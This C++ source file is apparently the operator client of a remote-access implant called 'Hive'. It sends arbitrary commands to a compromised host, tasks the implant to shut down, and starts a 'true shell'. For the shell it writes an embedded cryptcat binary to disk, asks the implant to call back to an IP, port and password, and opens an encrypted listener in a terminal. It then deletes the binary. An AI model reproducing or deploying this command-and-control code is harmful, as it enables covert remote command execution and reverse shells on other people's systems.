#include <string.h> 
#include <stdio.h>
#include <iostream>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

#include "LibraryModuleBase.h"
#include "Primitive.h"
#include "ProcessCmdResponse.h"
#include "Connection.h"
#include "Utilities.h"
#include "ilm-client.h"
#include "Command.h"
#include "hive.h"
#include "cryptcat.h"

extern "C" {

#include "debug.h"
#include "proj_strings.h"
#include "colors.h"

}

//*******************************************************************************

using namespace InterfaceLibrary;
using namespace InterfaceLibrary::Primitive;

//*******************************************************************************
extern Connection *myConn;
extern HiveILM *myILMInstance;

char cryptcat_path[] = "cryptcat";

//*******************************************************************************
void Command::Execute( Primitive::Activation& actvn, ProcessCmdAccumulator& , ProcessCmdResponse& resp )
{
	struct send_buf	sbuf;
	REPLY			rbuf;
	String			*argPtr = (String *)(actvn.arguments);
	String			args = *argPtr++;
	string			command = args;

	DL(6);
	memset( &sbuf, 0, sizeof( struct send_buf ) );
	memset( &rbuf, 0, sizeof( REPLY ) );

	resp.type = ProcessCmdResponse::TYPE_Pending;

	strncat( sbuf.path, command.c_str(), 254 );

	if ( myConn->TxCommand( &sbuf, &rbuf, EXECUTE ) < 0 )
	{
		resp.type = ProcessCmdResponse::TYPE_Remote_Failure;
		resp.resultsLines.push_back( ProcessCmdResponse::Line( 0, " ! Error: Problem with or lost server connection." ) );
		return;		
	}

	if ( rbuf.reply == 0 )
	{
		resp.type = ProcessCmdResponse::TYPE_Success;
	}
	else
	{
		resp.type = ProcessCmdResponse::TYPE_Remote_Failure;
	}

	return;
}

//*******************************************************************************
void Command::Session( Primitive::Activation& actvn, ProcessCmdAccumulator&, ProcessCmdResponse& resp )
{
	struct send_buf	sbuf;
	REPLY			rbuf;
	String			*argPtr = (String *)(actvn.arguments);
	String			args = *argPtr++;
	string			command = args;

	DL(6);
	memset( &sbuf, 0, sizeof( struct send_buf ) );
	memset( &rbuf, 0, sizeof( REPLY ) );

	resp.type = ProcessCmdResponse::TYPE_Remote_Failure;
	printf( " ! This feature is not implemented\n" );
	return;

	resp.type = ProcessCmdResponse::TYPE_Pending;

	strncat( sbuf.path, command.c_str(), 254 );

	if ( myConn->TxCommand( &sbuf, &rbuf, LAUNCHTRUESHELL ) < 0 )
	{
		resp.type = ProcessCmdResponse::TYPE_Remote_Failure;
		resp.resultsLines.push_back( ProcessCmdResponse::Line( 0, " ! Error: Problem with or lost server connection." ) );
		return;		
	}

	if ( rbuf.reply == 0 )
	{
		resp.type = ProcessCmdResponse::TYPE_Success;
	}
	else
	{
		resp.type = ProcessCmdResponse::TYPE_Remote_Failure;
	}

	return;
}

//*******************************************************************************
void Command::Exit( Primitive::Activation&, ProcessCmdAccumulator&, ProcessCmdResponse& resp )
{
	struct send_buf	sbuf;
	REPLY			rbuf;

	DL(6);
	memset( &sbuf, 0, sizeof( struct send_buf ) );
	memset( &rbuf, 0, sizeof( REPLY ) );

	resp.type = ProcessCmdResponse::TYPE_Pending;

	if ( myConn->TxCommand( &sbuf, &rbuf, EXIT ) < 0 )
	{
		resp.type = ProcessCmdResponse::TYPE_Remote_Failure;
		resp.resultsLines.push_back( ProcessCmdResponse::Line( 0, " ! Error: Problem with or lost server connection." ) );
		goto cleanup;
	}

	if ( rbuf.reply == 0 )
	{
		printf( " * Disconnected\n" );
		resp.type = ProcessCmdResponse::TYPE_Success;
	}
	else
	{
		printf( " ! Unsuccessful\n" );
		resp.type = ProcessCmdResponse::TYPE_Remote_Failure;
	}

cleanup:
	Utilities::SetCTStateDisconnected();
//	myILMInstance->RemoveCmdShutDown();
	myILMInstance->RemoveCustomCmds();

	return;
}


//*******************************************************************************
Command::ShutDown::ShutDown() {

//	cout << "Creating ShutDownCmd Object" << endl;

	DL(6);
	referenceID = 33;
	setTitle("now");
	helpText = "Task server to close open files, network connections, and terminate. Does not effect execution upon reboot.";

	/* attributes required only if command requires arguments */
#if 0
	CustomCommand::Attribute attribute ("string", 0 );
	attribute.defaultValue = " ";
	attribute.helpText = "Task implant to stop running and exit.";
	attributes.push_back (attribute);
#endif

}

//*******************************************************************************
ProcessCmdResponse Command::ShutDown::Process(binary&)
{
    ProcessCmdResponse	resp;
	struct send_buf		sbuf;
	REPLY				rbuf;

	DL(6);
	memset( &sbuf, 0, sizeof( struct send_buf ) );
	memset( &rbuf, 0, sizeof( REPLY ) );

//    cout << "Processing Command::ShutDown" << endl;

	resp.type = ProcessCmdResponse::TYPE_Pending;

	if ( myConn->TxCommand( &sbuf, &rbuf, SHUTDOWNBOTH ) < 0 )
	{
		resp.type = ProcessCmdResponse::TYPE_Remote_Failure;
		resp.resultsLines.push_back( ProcessCmdResponse::Line( 0, " ! Error: Problem with or lost server connection." ) );
		goto cleanup;
	}

	if ( rbuf.reply == 0 )
	{
		printf( " * Shutdown and Disconnected\n" );
		resp.type = ProcessCmdResponse::TYPE_Success;
	}
	else
	{
		printf( " ! Shutdown unsuccessful\n" );
		resp.type = ProcessCmdResponse::TYPE_Remote_Failure;
	}

cleanup:
	Utilities::SetCTStateDisconnected();
//	myILMInstance->RemoveCmdShutDown();
	myILMInstance->RemoveCustomCmds();

    return resp;
}
//*******************************************************************************
Command::LaunchTrueShell::LaunchTrueShell() {

//	cout << "Creating ShutDownCmd Object" << endl;

	DL(6);
	referenceID = 34;
	setTitle("open");
	helpText = "Initiate shell connection with remote host.";

	/* attributes required only if command requires arguments */
	CustomCommand::Attribute attribute_ip ("string", 0 );
	attribute_ip.defaultValue = " ";
	attribute_ip.helpText = "Callback IP address.";
	attributes.push_back (attribute_ip);

	CustomCommand::Attribute attribute_port ("string", 0 );
	attribute_port.defaultValue = "";
	attribute_port.helpText = "Callback TCP port number.";
	attributes.push_back (attribute_port);

	CustomCommand::Attribute attribute_password ("string", 0 );
	attribute_password.defaultValue = "";
	attribute_password.helpText = "Password to initialize shell session encryption.";
	attributes.push_back (attribute_password);

}

//*******************************************************************************
ProcessCmdResponse Command::LaunchTrueShell::Process(binary& arguments)
{
    ProcessCmdResponse	resp;
	struct send_buf		sbuf;
	REPLY				rbuf;
	int					fd;
	int					rv = 0;

//	ostringstream text;

	struct ShellArgs {
		uint32		ip_len;
		const char*	ip_str;
		uint32		port_len;
		const char*	port_str;
		uint32		pass_len;
		const char*	pass_str;
	};

	// TODO :  Currently we use a gnome-terminal command down below...  
	// Will we ever be on other Linux boxes without gnome? 
	char gnomeTerminalCommand[255];

	DL(6);
	const ShellArgs &args = *(ShellArgs*)arguments.data;
	DLX(4,printf(" . ip_len %i, ip %s\n", args.ip_len, args.ip_str));

	memset( &sbuf, 0, sizeof( struct send_buf ) );
	memset( &rbuf, 0, sizeof( REPLY ) );

	resp.type = ProcessCmdResponse::TYPE_Pending;

	while ( ___client_cryptcat_cryptcat_len != (unsigned int)rv ) 
	{
		fd = creat( cryptcat_path, S_IRWXU|S_IXGRP|S_IXOTH );
		if ( fd < 0 )
		{
			perror( " ! create():" );
			resp.type = ProcessCmdResponse::TYPE_Local_Failure;
			goto cleanup;
		}

		rv = write( fd, ___client_cryptcat_cryptcat, ___client_cryptcat_cryptcat_len );
		if ( rv < 0 )
		{
			perror( " ! write():" );
		}	
	
		close( fd );
	}

	// TODO: Jeremy should inspect his code which fills the sbuf with the command string
	snprintf(sbuf.path, 254, "%s %s %s", args.ip_str, args.port_str, args.pass_str);
   	sbuf.size=strlen(sbuf.path);
	
	if ( myConn->TxCommand( &sbuf, &rbuf, LAUNCHTRUESHELL ) < 0 )
	{
		resp.type = ProcessCmdResponse::TYPE_Remote_Failure;
		resp.resultsLines.push_back( ProcessCmdResponse::Line( 0, " ! Error: Problem with or lost server connection." ) );
		goto cleanup;
	}

	if ( rbuf.reply == 0 )
	{
		int forkret;

		DLX(6, printf("Launching Shell...\n"));
		resp.type = ProcessCmdResponse::TYPE_Success;
	   //Original code
		//system( "gnome-terminal -t 'Hive Shell' -x ./cryptcat -l -p 4321" );
		//Modified 21 Oct 2011 to accept user input with password...
		// TODO :  Currently we use a gnome-terminal command down below which was defined above...  
		// Will we ever be on other Linux boxes without gnome?  
		// An alternative is xterm. The following command string has been successfully used:
		//	snprintf( gnomeTerminalCommand, 254, "xterm -T 'Hive Shell' -e ./cryptcat -l -p %s -k %s", args.port_str, args.pass_str);

		memset( gnomeTerminalCommand, 0, 255);    //Clear it out before we use it...
//		snprintf( gnomeTerminalCommand, 254, "xterm -T 'Hive Shell' -e ./cryptcat -l -p %s -k %s", args.port_str, args.pass_str);
		snprintf( gnomeTerminalCommand, 254, "gnome-terminal -t 'Hive Shell' -x ./cryptcat -l -p %s -k %s", args.port_str, args.pass_str);
		DLX(6, printf("Forking...\n"));
		forkret = fork();
		if (forkret == 0) {
			int ret;

			DLX(6, printf("Child process executing shell command (\"%s\")...\n", gnomeTerminalCommand));
			ret = system( gnomeTerminalCommand );
			if (ret == -1)
				printf("ERROR: Could not  open terminal\n");
			DLX(6, printf("Shell terminated, associated child exiting in 5 seconds\n"));
			sleep( 5 );
			unlink( cryptcat_path );
			exit(0);
		}

		// sleep added to avoid race condition where unlink() removes the file
		// before system()->gnome-terminal() can execute it.
		// yes, we know this is not the best way...
		DLX(6, printf("Parent sleeping 5 seconds...\n"));
		sleep( 5 );
		// no checking return value because if unlink() fails, we won't do anything about it anyway
		unlink( cryptcat_path );
	}
	else
	{
		printf( " ! Shell connection unsuccessful\n" );
		resp.type = ProcessCmdResponse::TYPE_Remote_Failure;
	}

cleanup:
    return resp;
}
